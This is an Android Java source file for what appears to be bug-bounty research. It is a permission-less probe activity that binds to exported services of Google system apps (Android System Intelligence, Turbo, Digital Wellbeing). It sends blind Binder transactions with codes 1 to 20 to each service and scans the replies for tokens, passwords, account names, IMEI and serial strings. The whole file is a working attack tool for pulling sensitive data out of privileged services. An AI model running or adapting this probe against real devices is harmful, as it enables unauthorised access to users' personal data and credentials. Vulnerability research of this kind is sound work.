package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class ServiceBindProbeActivity extends Activity {
    private static final String T = "SVCBIND";
    private int probesDone = 0;
    private int totalProbes = 0;

    private static final String[][] SERVICES = {
        // ASI gRPC — no permission in manifest
        {"com.google.android.as",
         "com.google.android.apps.miphone.aiai.pwm.api.impl.PwmEndpointGrpcService",
         "io.grpc.action.BIND",
         "ASI_PWM_gRPC"},

        // ASI federated learning — no permission
        {"com.google.android.as",
         "com.google.android.apps.miphone.aiai.common.brella.service.AiAiFederatedDataService",
         "com.google.android.apps.miphone.aiai.EXAMPLE_STORE_V1",
         "ASI_FederatedData"},

        // ASI federated computation result
        {"com.google.android.as",
         "com.google.android.apps.miphone.aiai.common.brella.service.AiAiFederatedDataHandlingService",
         "com.google.android.apps.miphone.aiai.COMPUTATION_RESULT_V1",
         "ASI_ComputationResult"},

        // Turbo Impulse Client — no permission listed
        {"com.google.android.apps.turbo",
         "com.google.android.apps.turbo.adaptiveplatform.impulse.ImpulseClientService",
         "com.google.android.apps.turbo.PixelImpulseClient.BIND",
         "Turbo_ImpulseClient"},

        // Turbo Feature Eligibility — grpc, no permission
        {"com.google.android.apps.turbo",
         "com.google.android.apps.turbo.featureeligibilityservice.FeatureEligibilityEndpointService",
         "grpc.io.action.BIND",
         "Turbo_FeatureElig_gRPC"},

        // Turbo training service
        {"com.google.android.apps.turbo",
         "com.google.android.gms.learning.internal.training.InAppTrainingService",
         "com.google.android.gms.learning.training.START",
         "Turbo_Training"},

        // Turbo example store
        {"com.google.android.apps.turbo",
         "com.google.android.gms.learning.examplestoreimpl.defaultimpl.DefaultExampleStoreService",
         "com.google.android.gms.learning.EXAMPLE_STORE",
         "Turbo_ExampleStore"},

        // Wellbeing Chrome usage stats service
        {"com.google.android.apps.wellbeing",
         "com.google.android.apps.wellbeing.web.wellbeing.impl.WellbeingService",
         "org.chromium.chrome.browser.usage_stats.service.WELLBEING",
         "Wellbeing_ChromeUsage"},

        // Wellbeing AppFunction service (Android 16+)
        {"com.google.android.apps.wellbeing",
         "com.google.android.apps.wellbeing.appfunctions.WellbeingAppFunctionService",
         "android.app.appfunctions.AppFunctionService",
         "Wellbeing_AppFunction"},

        // ASI MessageArmour overlay service
        {"com.google.android.as",
         "com.google.android.apps.miphone.aiai.safecomms.overlayservice.MessageArmourOverlayService",
         "com.google.android.apps.miphone.aiai.safecomms.overlayservice.MESSAGE_ARMOUR_SURVEY_ACTION",
         "ASI_MessageArmour"},
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Service Binding Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid());
        totalProbes = SERVICES.length;

        for (String[] svc : SERVICES) {
            bindAndProbe(svc[0], svc[1], svc[2], svc[3]);
        }

        getWindow().getDecorView().postDelayed(() -> {
            Log.w(T, "=== PROBE COMPLETE (" + probesDone + "/" + totalProbes + " done) ===");
        }, 8000);
    }

    private void bindAndProbe(String pkg, String cls, String action, String label) {
        Intent intent = new Intent(action);
        intent.setComponent(new ComponentName(pkg, cls));

        ServiceConnection conn = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Log.w(T, "[!!!] BOUND to " + label + " — " + name);
                probesDone++;
                try {
                    String desc = service.getInterfaceDescriptor();
                    Log.w(T, "  desc=" + desc);
                } catch (Exception e) {
                    Log.w(T, "  no desc: " + e.getClass().getSimpleName());
                }

                // Probe transaction codes 1-20
                for (int tx = 1; tx <= 20; tx++) {
                    try {
                        Parcel d = Parcel.obtain();
                        Parcel r = Parcel.obtain();
                        try {
                            String desc = service.getInterfaceDescriptor();
                            if (desc != null) d.writeInterfaceToken(desc);
                        } catch (Exception e) {}
                        d.writeInt(0);
                        boolean ok = service.transact(tx, d, r, 0);
                        r.setDataPosition(0);
                        if (r.dataAvail() > 4) {
                            int exc = r.readInt();
                            if (exc == 0 && r.dataAvail() > 0) {
                                Log.w(T, "  [+] " + label + " TX" + tx + " avail=" + r.dataAvail());
                                extractStrings(r, label + "_TX" + tx);
                            }
                        }
                        d.recycle();
                        r.recycle();
                    } catch (Exception e) {}
                }

                try {
                    unbindService(this);
                } catch (Exception e) {}
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.w(T, "[x] Disconnected from " + label);
            }
        };

        try {
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);
            if (bound) {
                Log.w(T, "[+] Binding to " + label + "...");
            } else {
                Log.w(T, "[-] bindService returned false for " + label);
                probesDone++;
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] " + label + " SECURITY: " + shortMsg(se));
            probesDone++;
        } catch (Exception e) {
            Log.w(T, "[-] " + label + ": " + e.getClass().getSimpleName() + ": " + shortMsg(e));
            probesDone++;
        }
    }

    private void extractStrings(Parcel p, String label) {
        int saved = p.dataPosition();
        try {
            p.setDataPosition(0);
            byte[] raw = p.marshall();
            StringBuilder sb = new StringBuilder();
            for (byte b : raw) {
                if (b >= 32 && b < 127) sb.append((char) b);
                else {
                    if (sb.length() >= 4) {
                        String s = sb.toString();
                        if (s.contains("@") || s.contains("gmail") || s.contains("token") ||
                            s.contains("password") || s.contains("account") || s.contains("key") ||
                            s.contains("user") || s.contains("http") || s.contains("content://") ||
                            s.contains("phone") || s.contains("imei") || s.contains("serial") ||
                            s.contains("data") || s.contains("model") || s.contains("train") ||
                            s.contains("learn") || s.contains("feature") || s.contains("usage") ||
                            s.contains("stat") || s.contains("battery") || s.contains("thermal") ||
                            s.contains("privacy") || s.contains("config")) {
                            Log.w(T, "  [!!!] " + label + " SENSITIVE: " + s.substring(0, Math.min(s.length(), 200)));
                        } else if (s.length() > 10) {
                            Log.w(T, "  " + label + " str: " + s.substring(0, Math.min(s.length(), 100)));
                        }
                    }
                    sb.setLength(0);
                }
            }
        } catch (Exception e) {}
        p.setDataPosition(saved);
    }

    private String shortMsg(Exception e) {
        String msg = e.getMessage();
        if (msg == null) return "";
        return msg.substring(0, Math.min(msg.length(), 120));
    }
}
